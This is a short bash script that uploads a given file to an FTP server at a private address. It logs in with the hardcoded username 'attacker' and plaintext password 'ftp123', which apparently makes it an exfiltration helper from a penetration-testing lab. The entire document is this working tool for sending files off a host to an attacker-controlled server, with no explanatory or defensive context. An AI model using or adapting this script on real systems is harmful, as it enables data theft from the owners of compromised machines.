#!/bin/bash
# Upload a file to an FTP server using ftp in batch mode

FTP_SERVER="10.11.0.123"
USERNAME="attacker"
PASSWORD="ftp123"
FILE="$1"

if [[ ! -f "$FILE" ]]; then
    echo "File not found: $FILE"
    exit 1
fi

ftp -inv $FTP_SERVER <<EOF
user $USERNAME $PASSWORD
put $FILE
bye
EOF
